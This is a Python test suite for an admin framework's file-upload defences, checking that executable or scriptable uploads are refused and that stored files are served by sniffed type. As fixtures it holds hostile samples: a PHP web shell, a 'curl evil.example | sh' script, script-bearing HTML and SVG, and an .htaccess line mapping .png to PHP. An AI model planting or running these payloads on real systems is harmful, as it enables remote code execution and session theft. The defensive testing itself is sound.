"""What an upload is allowed to be, and what it is allowed to be served as.

Uploaded files come back out of `/admin/media/…`, which is the admin's own
origin -- the origin the session cookie is scoped to. A stored file the browser
can be persuaded to execute as a document is therefore not a curiosity, it is
script running as whoever opened it, with their session.

Three defences, tested separately here because any one of them alone leaves the
hole open:

* an allow-list on the extension, so a field for pictures holds pictures;
* a sniff of the leading bytes, so the extension has to be true;
* a `Content-Type` decided at serve time from those bytes rather than from the
  name, so a file that got onto disk some other way is still harmless.

`test_admin_files.py` covers the happy path and the storage layout. This file
only asks what happens to things that should not be stored at all.
"""

from __future__ import annotations

import re
from collections.abc import AsyncIterator
from pathlib import Path
from typing import ClassVar

import httpx
import pytest
from fastapi import FastAPI
from tests.conftest import sign_in
from tests.orm.models import Product, StaffUser

from fastfort import FastFort, FastFortSettings, admin
from fastfort.admin.files import (
    DANGEROUS_EXTENSIONS,
    check_upload,
    content_type_for,
    extensions_of,
    safe_filename,
    sniff,
)
from fastfort.core.exceptions import ImproperlyConfigured
from fastfort.core.settings import MediaSettings
from fastfort.orm.sqlalchemy import SQLAlchemyBackend

SECRET = "n7Qw2xLp9vRt4KjM8sYzB3cF6hVdA1gE"

pytestmark = pytest.mark.usefixtures("seeded")

PNG = b"\x89PNG\r\n\x1a\n" + b"\x00" * 64
GIF = b"GIF89a" + b"\x00" * 64
ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 64
PE = b"MZ\x90\x00" + b"\x00" * 64
HTML = b"<!doctype html><script>fetch('/admin/')</script>"
SVG = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
SHELL = b"#!/bin/sh\ncurl evil.example | sh\n"


class ProductAdmin(admin.ModelAdmin):
    list_display = ("id", "name")
    verbose_name_plural = "Products"
    formfield_overrides: ClassVar[dict[str, str]] = {"attachment": "file"}


def build(backend: SQLAlchemyBackend, media_root: Path) -> FastAPI:
    fort = FastFort(
        FastFortSettings(  # type: ignore[call-arg]
            secret_key=SECRET,
            media={"root": media_root},  # type: ignore[arg-type]
            security={"cookie_secure": False},  # type: ignore[arg-type]
        ),
        backend=backend,
    )
    fort.set_user_model(StaffUser)
    fort.register(Product, ProductAdmin, key="shop.product")

    app = FastAPI()
    fort.mount(app)
    return app


@pytest.fixture
def media_root(tmp_path: Path) -> Path:
    root = tmp_path / "media"
    root.mkdir()
    return root


@pytest.fixture
async def client(
    backend: SQLAlchemyBackend, staff_user: StaffUser, media_root: Path
) -> AsyncIterator[httpx.AsyncClient]:
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=build(backend, media_root)), base_url="http://testserver"
    ) as opened:
        await sign_in(opened)
        yield opened


async def upload(client: httpx.AsyncClient, filename: str, content: bytes) -> tuple[int, str]:
    """Submit `content` as `filename` through the real change form."""
    path = "/admin/shop.product/1/"
    body = (await client.get(path)).text

    fields: dict[str, str] = {}
    for tag in re.findall(r"<input\b[^>]*>", body):
        name = re.search(r'name="([^"]+)"', tag)
        if not name:
            continue
        if 'type="checkbox"' in tag and "checked" not in tag:
            continue
        value = re.search(r'value="([^"]*)"', tag)
        if value:
            fields[name.group(1)] = value.group(1)

    response = await client.post(
        path,
        data=fields,
        files={"attachment": (filename, content, "application/octet-stream")},
    )
    return response.status_code, response.text


def stored(root: Path) -> list[Path]:
    return [p for p in root.rglob("*") if p.is_file()]


# ---------------------------------------------------------------------------
# The extension
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        ("shell.php", b"<?php system($_GET['c']); ?>"),
        ("page.html", HTML),
        ("logo.svg", SVG),
        ("run.sh", SHELL),
        ("tool.exe", PE),
        ("payload.jsp", b"<% out.print(1); %>"),
        (".htaccess", b"AddHandler application/x-httpd-php .png\n"),
    ],
)
async def test_an_executable_upload_is_refused(
    client: httpx.AsyncClient, media_root: Path, filename: str, content: bytes
) -> None:
    """Not stored, and not a 500 either: a refusal belongs on the field.

    `.htaccess` is in this list because it is the one upload that needs no
    execution of its own -- it reconfigures the server into executing the next
    one.
    """
    status, body = await upload(client, filename, content)
    assert status == 200, "a refused upload should redisplay the form, not redirect"
    assert stored(media_root) == [], f"{filename} reached disk"
    assert "never accepted" in body or "must be one of" in body


async def test_a_refusal_says_what_would_be_accepted(client: httpx.AsyncClient) -> None:
    """ "That file is not allowed" tells somebody holding a `.dwg` nothing about
    whether to rename it, convert it, or go and ask an administrator."""
    _, body = await upload(client, "drawing.dwg", b"\x00\x00\x00\x00")
    assert ".pdf" in body
    assert ".png" in body


# ---------------------------------------------------------------------------
# The extension in the middle of the name
# ---------------------------------------------------------------------------


async def test_a_buried_extension_does_not_reach_disk(
    client: httpx.AsyncClient, media_root: Path
) -> None:
    """`hack.exe.png` is a real picture with a name a server may read left to
    right and hand to an interpreter. It is stored, because the bytes are
    genuinely a PNG -- but not under a name with `.exe` in it."""
    status, _ = await upload(client, "hack.exe.png", PNG)
    assert status == 303

    files = stored(media_root)
    assert len(files) == 1
    assert ".exe" not in files[0].name
    assert files[0].name.endswith("hack_exe.png")


def test_an_ordinary_name_with_two_dots_is_left_alone() -> None:
    """The neutralising above must not rewrite `archive.tar.gz`.

    A rule that mangles ordinary filenames is a rule people route around, and
    `tar` is not something any server executes.
    """
    assert safe_filename("archive.tar.gz") == "archive.tar.gz"
    assert safe_filename("q3.2026.report.pdf") == "q3.2026.report.pdf"


def test_a_domain_in_a_filename_is_not_a_refusal() -> None:
    """`.com` is an executable extension and also the end of every second
    hostname. Neutralising rather than refusing is what keeps both true."""
    assert check_upload("example.com.pdf", b"%PDF-1.7\n", allowed=frozenset({"pdf"})) is None
    assert safe_filename("example.com.pdf") == "example_com.pdf"


# ---------------------------------------------------------------------------
# The bytes
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("filename", "content"),
    [
        ("photo.png", ELF),
        ("photo.png", PE),
        ("photo.png", HTML),
        ("photo.jpg", SHELL),
        ("report.pdf", HTML),
        ("photo.png", b"just some text pretending to be a picture"),
    ],
)
async def test_an_extension_that_lies_about_the_content_is_refused(
    client: httpx.AsyncClient, media_root: Path, filename: str, content: bytes
) -> None:
    """The allow-list alone would pass every one of these: they all end in an
    extension the field accepts. What makes them attacks is that the name and
    the bytes disagree, so the bytes are what settles it."""
    status, _ = await upload(client, filename, content)
    assert status == 200
    assert stored(media_root) == []


async def test_a_file_that_is_what_it_says_is_stored(
    client: httpx.AsyncClient, media_root: Path
) -> None:
    """The check has to let real files through, or it is only an outage."""
    assert (await upload(client, "photo.png", PNG))[0] == 303
    assert len(stored(media_root)) == 1


def test_text_without_a_signature_is_not_refused_for_lacking_one() -> None:
    """`.txt`, `.csv` and `.md` have no magic number at all. Demanding one would
    refuse every plain text file ever uploaded."""
    allowed = frozenset({"txt", "csv", "md"})
    assert check_upload("notes.txt", b"just some notes", allowed=allowed) is None
    assert check_upload("rows.csv", b"a,b,c\n1,2,3\n", allowed=allowed) is None


# ---------------------------------------------------------------------------
# Serving
# ---------------------------------------------------------------------------


async def test_a_stored_file_is_typed_by_its_bytes_not_its_name(
    client: httpx.AsyncClient, media_root: Path
) -> None:
    """The defence that covers files this version of FastFort did not write.

    A `.html` cannot be uploaded any more -- but one placed under the media root
    by an older release, a migration or a backup restore still must not come back
    as `text/html` from the origin holding the session cookie.
    """
    planted = media_root / "shop.product" / "attachment"
    planted.mkdir(parents=True)
    (planted / "old.html").write_bytes(HTML)

    response = await client.get("/admin/media/shop.product/attachment/old.html")
    assert response.status_code == 200
    assert "text/html" not in response.headers["content-type"]
    assert response.headers["content-disposition"].startswith("attachment")
    # From the security middleware, and it has to reach this route too: without
    # it `text/plain` is advice a browser is free to sniff its way past.
    assert response.headers["x-content-type-options"] == "nosniff"


async def test_an_image_is_still_shown_in_place(
    client: httpx.AsyncClient, media_root: Path
) -> None:
    """Everything being a download would be safe and useless: the thumbnail
    column and the upload card's preview both need the image inline."""
    planted = media_root / "shop.product" / "attachment"
    planted.mkdir(parents=True)
    (planted / "real.png").write_bytes(PNG)

    response = await client.get("/admin/media/shop.product/attachment/real.png")
    assert response.status_code == 200
    assert response.headers["content-type"] == "image/png"
    assert response.headers["content-disposition"] == "inline"


def test_serving_never_trusts_the_stored_name() -> None:
    assert content_type_for(PNG) == ("image/png", True)
    assert content_type_for(GIF) == ("image/gif", True)
    for hostile in (HTML, SVG, ELF, SHELL):
        content_type, inline = content_type_for(hostile)
        assert not inline
        assert content_type.startswith("text/plain")


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------


def test_a_project_cannot_allow_list_its_way_into_serving_script() -> None:
    """Caught at start-up, because the failure it prevents is a stored XSS hole
    and the moment to hear about it is while writing the settings."""
    for extension in ("svg", "html", "php"):
        with pytest.raises(ImproperlyConfigured, match="never store"):
            MediaSettings(allowed_extensions={"png", extension})


def test_an_extension_is_written_however_the_reader_writes_it() -> None:
    """`.PNG`, `PNG` and `png` are the same extension. A leading dot is how
    everybody writes one down, and a caller copying one out of a filename gets
    whatever case that filename had."""
    media = MediaSettings(allowed_extensions={".PNG", "Jpg", ".pdf"})
    assert media.allowed_extensions == frozenset({"png", "jpg", "pdf"})


def test_svg_is_not_an_image() -> None:
    """It is a document that can carry a `<script>` element. The default image
    list is the place that has to say so."""
    assert "svg" not in MediaSettings().allowed_image_extensions
    assert "svg" in DANGEROUS_EXTENSIONS


# ---------------------------------------------------------------------------
# The pieces, directly
# ---------------------------------------------------------------------------


def test_extensions_are_read_out_of_a_name_in_order() -> None:
    assert extensions_of("hack.exe.png") == ["exe", "png"]
    assert extensions_of("archive.tar.gz") == ["tar", "gz"]
    assert extensions_of("/tmp/../photo.JPG") == ["jpg"]
    assert extensions_of("no-extension") == []
    # A digit run is a version or a date, not a format.
    assert extensions_of("report.2026.pdf") == ["pdf"]


def test_sniffing_says_nothing_rather_than_guessing() -> None:
    """Silence is a real answer. Plain text has no signature at all, and a caller
    handed a guess in place of that silence would refuse every text file."""
    assert sniff(b"just text") is None
    assert sniff(PNG) == "png"
    assert sniff(ELF) == "executable"
    assert sniff(SHELL) == "script"
    assert sniff(b"   \n\t" + HTML) == "markup", "leading whitespace must not hide markup"
